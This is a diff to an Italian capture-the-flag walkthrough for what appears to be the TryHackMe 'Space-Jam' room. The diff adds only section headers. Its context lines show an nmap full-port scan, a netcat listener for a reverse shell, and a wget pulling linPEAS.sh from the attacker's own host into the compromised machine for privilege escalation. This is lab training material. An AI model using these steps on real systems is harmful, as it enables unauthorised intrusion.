@@ -1,5 +1,5 @@
 # Space-Jam
-### ENUM
+## ENUMERAZIONE
 partiamo con uno scan della macchina
 
 ```bash
@@ -10,6 +10,7 @@ troviamo cosi la porta 3000 aperta(se non la trovate lanciate questo comando
 ```bash
 nmap Spacejam.thm -sV -p-
 ```
+## NETCAT
 mettiamoci in ascolto su una porta aperta da noi
 ```bash
 nc -lvnp 4444
@@ -34,6 +35,7 @@ facciamo una richiesta sulla shell ottenuta prima tramite questo comando
 wget http://ipvostro/linPEAS.sh
 ```
 
+## PRIVILEGE ESCALATION
 diamogli i giusti permessi
 ```bash
 chmod +x linPEAS.sh
